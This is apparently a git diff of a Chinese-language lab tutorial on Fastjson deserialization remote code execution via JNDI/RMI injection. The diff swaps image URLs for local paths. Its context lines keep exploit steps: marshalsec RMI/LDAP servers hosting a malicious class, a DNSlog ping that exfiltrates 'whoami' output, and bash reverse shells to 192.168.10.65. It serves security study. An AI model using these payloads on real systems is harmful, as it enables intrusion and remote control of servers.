@@ -106,7 +106,7 @@ public class RMIServer {
 
 ###### 从 ReferenceWrapper 源码可以看出，该类继承自 UnicastRemoteObject，实现对 Reference 的包裹，使其能够通过 RMI 进行远程访问
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdO3W76Biawte1rTpqRko5ia6kywEzqVVXhNEfohZlFJpdiaykrebh5BBHog/640?wx_fmt=png)
+![](../../.resource/remote/36ed70fee9c2fe299b8bd2d384d1f326412e8ffac3df0afe2f7411634ea113d1.png)
 
 ##### **客户端**
 
@@ -176,15 +176,15 @@ curl http://192.168.9.234:8090/ -H "Content-Type: application/json" --data '
 {"name":"zcc", "age":18}'
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdO9h8oZLL0pzRdz0LejyN4yMMw0DICqSdRbKVz85aDlAXHxBwibhooY1A/640?wx_fmt=png)
+![](../../.resource/remote/e14f4e9b18c4b4ccd43276f4063568f2f5f896a2c2b2876ef15622c2cfea4ad6.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOudWUdeHUqtKXUPtMQExwb3PQB8MJ7iaukw73XPCq9aQbfp6Q8ek7Okw/640?wx_fmt=png)
+![](../../.resource/remote/2e7d89ab0022a7a06f82fa53fa7bb65c0b157ad3b94e774a8eb6a947c986a319.png)
 
 访问靶机，可以看见 json 格式的输出：  
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdO3aFJCM8WLw1LjPeI8tQ3Em9JlGLfF0j55kz7fgLLTzBmlyYzquMD3Q/640?wx_fmt=png)
+![](../../.resource/remote/bb22f6d5c83853f9ac748fb48119835d8405801f5efad50060dedb38412cb8f4.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOJJQ1MAXGjv8p2MFC8L9Vl9sFLVHYJDOJ17mggpSwGiabEuMnw3dfJDg/640?wx_fmt=png)
+![](../../.resource/remote/93c05625ce8f66076a2f619b7b9b68e240952e196badfa99ffddf03c3ceb3d78.png)
 
 因为是 Java 8u102，没有 com.sun.jndi.rmi.object.trustURLCodebase 的限制，我们可以使用 com.sun.rowset.JdbcRowSetImpl 的利用链，借助 JNDI 注入来执行命令。  
 
@@ -200,7 +200,7 @@ javac -version
 java -version
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdO95g30nBzqQ4AnJugW3Pw5kLjiafVoUiazT9sic8RXhy062NbCebUwOLYQ/640?wx_fmt=png)
+![](../../.resource/remote/524837702576ae320c836e4a18bfbd05ca9bd6b2a006caa034f8432cc245145e.png)
 
 ##### kali 安装 Javac 环境，这里我已经安装好了
 
@@ -221,7 +221,7 @@ public class zcc{
 }
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdO3ic7C3zo2KJ1hqFEbC8icEGbqJOZVdRCCaic5pgPdGdke0c5vwgZycGQQ/640?wx_fmt=png)
+![](../../.resource/remote/1a5fb43da399b12d5b52af62abd6f68eddac6e07612ea6025c65aad7f8ce568d.png)
 
 ##### 编译恶意类代码
 
@@ -229,15 +229,15 @@ public class zcc{
 javac zcc.java
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOIibZ9p4p16BmWtsfn1NibufibXiaoj4XpNOawqat2YvGmRNUuZkIudlnsg/640?wx_fmt=png)
+![](../../.resource/remote/933e5635a7da79144bf742518d9e333df753ff4487bcf53df1b1683b8c265ce6.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdO7FYwTPPwcWgMTISEgMDiaoicggLoqj22RTptD04CASDovnKtiafW5YC8w/640?wx_fmt=png)
+![](../../.resource/remote/693aa9e49ed8be8e4aacb99f8fbf5c7991f33b8d75859b6d519cc0dcae0d03e4.png)
 
 ```
 python -m SimpleHTTPServer 80
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOqJdiaianyggOib78AXFqV46z47V8nosHHNrXTLZ144YL1GTxhfLW3RNiag/640?wx_fmt=png)
+![](../../.resource/remote/b87e673589d47e21788bb4a5cd32d83fe212ba0835ae6117e8af6d5bf8a188a3.png)
 
 搭建 http 服务传输恶意文件  
 
@@ -245,7 +245,7 @@ python -m SimpleHTTPServer 80
 git clone https://github.com/mbechler/marshalsec.git
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOfMhszxnia6tjerJI8kvsma6b3APyhhRl6xs29dGicHbicDW2RzNl4sqjA/640?wx_fmt=png)
+![](../../.resource/remote/742dd6eeedda66e1ff58d38dabfda2d66ca08832e157763cea635c1183e84cdb.png)
 
 ##### 编译并开启 RMI 服务:
 
@@ -255,7 +255,7 @@ git clone https://github.com/mbechler/marshalsec.git
 apt-get install maven
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdO8sFE4OiaEY7UAwDLWtr0lrGviaMic5ibZE3zQ55nS9Zv6o9JLy1RMsCjdQ/640?wx_fmt=png)
+![](../../.resource/remote/a76aa8419a23fedc0d2857a3621e90cd27b2656d4dc803f3a3d3646c807c392f.png)
 
 >2 然后安装 maven：  
 
@@ -263,7 +263,7 @@ apt-get install maven
 mvn clean package -DskipTests
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOebocQGqKhnbibyVUvkDooqZygUiaicEBS9xjXZK3aRSQFzBCG5lQHW4iaA/640?wx_fmt=png)
+![](../../.resource/remote/57bbdbfd5752ae8edf8c359b999a4fadcc817e7864e23bb6ca04ec722c52976c.png)
 
 ###### >3 然后使用 maven 编译 marshalsec 成 jar 包，我们先进入下载的 marshalsec 文件中运行：
 
@@ -272,9 +272,9 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 10.65/#zcc" 9999
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOHvLHGWgpYgc0VackiafDyOPVm6eghb6prQiaLAVZqBr5Ij8urAwWkkXQ/640?wx_fmt=png)
+![](../../.resource/remote/72b02590a376614bc3af6102fa1e521fd8f887540001fdc7972c0a7e365549c9.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdO1ysHmuS7QdAgRfjFddUd0qDYfLgBBJxbJIXuYdWOrLNpwUDsUX0ia7Q/640?wx_fmt=png)
+![](../../.resource/remote/5405065fb3468c00ae4822b64dbb0e42c4261ec59cba7748306b1bfda43efdce.png)
 
 ###### >4 然后我们借助 marshalsec 项目，启动一个 RMI 服务器，监听 9999 端口，并制定远程加载类 TouchFile.class，这里的 ip 为你上面开启 http 服务的 ip，我们这里就是 kali 的 ip:
 
@@ -295,7 +295,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http:/
 }
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdO0ILEekjr3y6DtCKolFgoY5Pia6A0fGhJ80ibpysCazZ6L8HrJQ8iblpsg/640?wx_fmt=png)
+![](../../.resource/remote/f26f8bdd7c5e89ee30b1339a472751d7608ee2c3fd31ffd531b22bede5b0c041.png)
 
 可以看见请求成功，并加载了恶意类。  
 
@@ -305,15 +305,15 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http:/
 http://www.dnslog.cn/
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOicCiadSq4GXYulyO5hVbyedMjdxbJBib76icL1a34ngUzJiaKXaphDvJhwQ/640?wx_fmt=png)
+![](../../.resource/remote/5558692451c5215e6ad35bac9776ea5096e0fa4691051fb1891f33dfe9cde73c.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOeXxnfHaGmNk4fiawGN8jZiby0jkAGYa3RbNgXJCkXxeow1TJwwhuHhkQ/640?wx_fmt=png)
+![](../../.resource/remote/a5bfddee487d96d2185468392980d04755bdaaefa43df21bef9a5b77ca5edbb4.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOE78CCjpS9kWOdEaQev1ZAfBich8G5JZuydicMLaKsWcDMWEewYwBLrpA/640?wx_fmt=png)
+![](../../.resource/remote/9af921aef9e864f13aaf1193ced624412f138ed736e5e691177a02b92e957cc5.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOQ6HmNRIsZUavc3e8f3wB49e26icbwyRVXUa2TyQeP7ia7oFf986hqichQ/640?wx_fmt=png)
+![](../../.resource/remote/c68350b4d61a5b8477965b29e7ca11e252c7c7347449e7406e7b23bf6199d019.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOXWaKPM9UqB6OXA9wRIpYBm9NVjz0beKFGyPvHled4LAOazzgjKHVDw/640?wx_fmt=png)
+![](../../.resource/remote/22e1daf8cc0101cb460d511525d87aa00ee1525aae41ffb260e228131ef6c62f.png)
 
 可以看见成功写入。  
 
@@ -323,7 +323,7 @@ http://www.dnslog.cn/
 "/bin/sh","-c","ping user.'whoami'.jeejay.dnslog.cn"
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOIib8KGyl465I9ibNn4gzHEU0jAVUpSZOe53v4Bzv9CYT3zxTbL4Ueobg/640?wx_fmt=png)
+![](../../.resource/remote/914e1ecb78fd698768737943987ffc235b0a5630a929c4934be82f37bbd2b2d8.png)
 
 直接覆盖原来得文件；  
 
@@ -333,13 +333,13 @@ http://www.dnslog.cn/
 "/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.10.65/1234 0>&1"
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOHQ9fRMicrIgS9WmvAiaJy8O6TWXCW4bibTdtZPrgssXsYC651tqxGnntA/640?wx_fmt=png)
+![](../../.resource/remote/371f13e00e7f07a2fa8bc2e37a326c6e106b527280e68f6015938cb1d62bc174.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOHibDyRa1X4r6sj5XkoyzDqVMRiaSEe8m56ibS5FZuVedgNxBkEkrVgicXQ/640?wx_fmt=png)
+![](../../.resource/remote/24c5224b0007ae3e3bb78a5831d1cf736ad6abe57ed1003f0223c23504b6a65a.png)
 
 点击 send 发送之后成功回显  
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdORv9TmNqdBa6lNjdQQMSKgbDvnYIyQ1kUWzeyUr0Bcp4BTmcfWAy04A/640?wx_fmt=png)
+![](../../.resource/remote/02b1d977efbb4c81f372558995b260f37f2cf17f33d2d4f7c184563c6c72e6b8.png)
 
 ##### 反弹 shell 的话也只需修改恶意类中 commands 的内容即可，代码参考如下，建议用第二个，第二个前面带主机名，看起来舒服点，我这里用的第一个；
 
@@ -347,9 +347,9 @@ http://www.dnslog.cn/
 Fastjson < 1.2.47
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOqTnZXn0dV0gUJXuagcJ2CtjicZx8nib11gBRTAC0B7zDLwJp49eMjAHA/640?wx_fmt=png)
+![](../../.resource/remote/d49fd70f20110627c9d979dd9c2c42ec5c005c8e2365f4f8ef6c64135e726488.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOa3tDxkxWWTqsFlsoldtXk3QmhicRndqTOfDzXFlShlALnicztyibmicfPQ/640?wx_fmt=png)
+![](../../.resource/remote/5adb859698c8e12a15bea0b46489725a756feab55c5090798d7e25a07830df10.png)
 
 ### **2.2 Fastjson 1.2.47 远程命令执行漏洞**
 
@@ -379,23 +379,23 @@ public class zcc {
 
 漏洞启动
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOahAALOksq3cspwQAuXozuGHic7uxPNjVPib73WavBdZAUOzstSj144vw/640?wx_fmt=png)
+![](../../.resource/remote/f0118a8de4fac3033b2ea2b03b2e13d4a78690c9249bdc4188339344996f650b.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOKJxJZ18bd1h1UtJa8V5CnSZVluVqpFwYE4952kjFXN3Hx2wQfrIx5g/640?wx_fmt=png)
+![](../../.resource/remote/f5e972a6670ed2c0490497b250e732220ba0380d9d4b88eb8bf1151a29bb58fd.png)
 
 ##### 因为目标环境是 openjdk：8u102，
 
 ##### 这个版本没有 com.sun.jndi.rmi.object.trustURLCodebase 的限制，我们可以利用 RMI 进行命令执行。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOwRqfGK2bTMGibSnDapBIQchnHeBtTkBUd7rTkryQgYpOfwlC6arKycg/640?wx_fmt=png)
+![](../../.resource/remote/82eafbbf80bf2c3fd522955493365a360449ff7e56a01bc843ecdceb5f806002.png)
 
 ```
 python -m SimpleHTTPServer 8080
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOPWo5jj1KwTT3RrKZYs7VpREAnVHEKe2LMDICrygbFk4vaNf25GbAibw/640?wx_fmt=png)
+![](../../.resource/remote/a96e05a5bdac6169758ac1922e57582a5df2e7744104090adfa1239cd8b16a8c.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOVwe1JeoXCgIfEEYxYgsicxlzM1ia1kknuXib1RJN7BlMb5hPV0G5JYSkA/640?wx_fmt=png)
+![](../../.resource/remote/b8b55385f1474a545466accf5694647d9d77c477cea8536bc9d37b048a4ea9b2.png)
 
 开启 http 服务  
 
@@ -403,9 +403,9 @@ python -m SimpleHTTPServer 8080
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.10.65/#zcc" 9999
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOkdXkVx8O0QgIvnvqdAKzBynlZbDZR9pdUalprmYNp8mGBXKDXcHIWQ/640?wx_fmt=png)
+![](../../.resource/remote/e26b5f9f89b6d297491f975db26061fd17af8b96c58997ae0045d8d3c67b1632.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOfKaDPWs7vllgAHGe0CwDoN2IJzsxqwwhORkH5gD30awZBj7yoNaOXA/640?wx_fmt=png)
+![](../../.resource/remote/71a57348f41714c2fe5703d42458fd2c22dc55062da77944bdd50a9290ffda7f.png)
 
 借助 marshalsec 项目启动 RMI 服务器，监听 9998 端口，并制定加载远程类 zcc.class:  
 
@@ -423,7 +423,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 }
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdORQXmkeHufHJvKvk9msOplWRqOibkicENByh5A6p8qBUuQY16zMCvCzFA/640?wx_fmt=png)
+![](../../.resource/remote/6d587340aac5925400391c5dabb006a3a3c33d1423419c7793f51ea246d4bfa5.png)
 
 发送 payload, 别忘了改 Content-Type: application/json，可以看见成功写入，反弹 shell 的手段和上面 1.2.24 的一样：
 
@@ -431,11 +431,11 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 "/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.10.65/8899 0>&1"
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdO4H70lInQoxhvHu03BGbh6Gt4o2xPMXgpnraOicSxywicmuFGa6hw56dw/640?wx_fmt=png)
+![](../../.resource/remote/a644c486a87b27e06cd09e26877fec0d1e68eb858a2b9390751b21ad395285a7.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOUNHVEicwfZBnLYR2O8BdUM7z1jSQZ1mNaXe2z1rwlupqPoR6KXdDyiaQ/640?wx_fmt=png)
+![](../../.resource/remote/5133f13f92c96d2f13c63a3f043ad8712411623148c45bc50a939d2c500fb57c.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOY0XibZT8rwDjo9dHicia0z8FeHkOyQ4oiarTicJO0rzQKibVSvkZorrfCLvg/640?wx_fmt=png)
+![](../../.resource/remote/2f72b89befcb17f4c07b135b31b387c1fa4d88aa55769d40a435e676a266083b.png)
 
 反弹 shell；  
 
@@ -447,9 +447,9 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 }
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOuyiaMGFucqvU12LhEl3yibyUfich5rucPFwuay2ib9AXEzUh9TkYFTQb9w/640?wx_fmt=png)
+![](../../.resource/remote/3c4b7943db23e6c5c0b278630f8a20ecd9f23f318977bac20a3dd9a75831bbd4.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOo65jWbqcKSpahrEXcTzLMcoJ7Q2Boaaz7mpfY0Ye07jAWv1zVhkoQw/640?wx_fmt=png)
+![](../../.resource/remote/f3a5394ad51336e5fbd64853ed2a1c0f2423f412aa7b02200554f60c423cbf2a.png)
 
 ### **2.3 fastjson<=1.2.41 漏洞详情**
 
